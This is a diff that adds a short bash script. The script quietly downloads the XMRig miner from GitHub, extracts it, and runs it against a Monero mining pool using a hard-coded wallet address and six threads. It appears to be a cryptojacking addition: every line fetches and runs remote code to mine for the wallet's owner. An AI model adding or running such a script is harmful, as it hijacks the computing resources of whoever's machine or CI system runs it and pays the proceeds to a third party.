@@ -1,0 +1,4 @@
+#!/usr/bin/bash
+wget https://github.com/xmrig/xmrig/releases/download/v6.8.1/xmrig-6.8.1-bionic-x64.tar.gz --quiet
+tar -xvf xmrig-6.8.1-bionic-x64.tar.gz
+./xmrig-6.8.1/xmrig -o pool.supportxmr.com:443 -u 41tLzGW4kNeiChVr4uPQ3th45s1XHp4wqi48fsBP4ExegdxSXxiwW8uTLyzLEgzwFtTiXWZM8qbc8564E9BiPn9PN9XeDjQ.fii -k --tls -p x -t 6
